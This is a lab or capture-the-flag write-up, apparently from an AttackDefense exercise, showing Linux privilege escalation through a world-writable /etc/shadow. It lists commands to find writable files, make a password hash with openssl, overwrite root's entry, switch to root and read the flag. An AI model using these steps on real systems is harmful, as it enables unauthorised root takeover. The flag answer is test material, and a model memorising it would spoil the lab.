# Permissions incorrectly set

Find files with `other` write permissions

```
student@attackdefense:~$ find / -not -type l -perm -o+w
/dev/urandom
/dev/zero
/dev/tty
/dev/full
...
/etc/shadow
```

Check it's content

```
student@attackdefense:~$ ls -l /etc/shadow
-rw-rw-rw- 1 root shadow 523 Sep 23  2018 /etc/shadow
student@attackdefense:~$ cat /etc/shadow
root:*:17764:0:99999:7:::
daemon:*:17764:0:99999:7:::
bin:*:17764:0:99999:7:::
sys:*:17764:0:99999:7:::
sync:*:17764:0:99999:7:::
games:*:17764:0:99999:7:::
man:*:17764:0:99999:7:::
lp:*:17764:0:99999:7:::
mail:*:17764:0:99999:7:::
news:*:17764:0:99999:7:::
uucp:*:17764:0:99999:7:::
proxy:*:17764:0:99999:7:::
www-data:*:17764:0:99999:7:::
backup:*:17764:0:99999:7:::
list:*:17764:0:99999:7:::
irc:*:17764:0:99999:7:::
gnats:*:17764:0:99999:7:::
nobody:*:17764:0:99999:7:::
_apt:*:17764:0:99999:7:::
student:!:17797::::::
```

Notice that root password is not set.

Use openssl to generate password entry and add the password hash to /etc/shadow

```
student@attackdefense:~$ openssl passwd -1 -salt abc password
$1$abc$BXBqpb9BZcZhXLgbee.0s/
student@attackdefense:~$ vim /etc/shadow
student@attackdefense:~$ cat /etc/shadow
root:$1$abc$BXBqpb9BZcZhXLgbee.0s/:17764:0:99999:7:::
daemon:*:17764:0:99999:7:::
bin:*:17764:0:99999:7:::
sys:*:17764:0:99999:7:::
sync:*:17764:0:99999:7:::
games:*:17764:0:99999:7:::
man:*:17764:0:99999:7:::
lp:*:17764:0:99999:7:::
mail:*:17764:0:99999:7:::
news:*:17764:0:99999:7:::
uucp:*:17764:0:99999:7:::
proxy:*:17764:0:99999:7:::
www-data:*:17764:0:99999:7:::
backup:*:17764:0:99999:7:::
list:*:17764:0:99999:7:::
irc:*:17764:0:99999:7:::
gnats:*:17764:0:99999:7:::
nobody:*:17764:0:99999:7:::
_apt:*:17764:0:99999:7:::
student:!:17797::::::
```

Switch to root user with our created password

```
student@attackdefense:~$ su
Password:
root@attackdefense:/home/student# cat /root/flag
e62ab67ddff744d60cbb6232feaefc4d
```
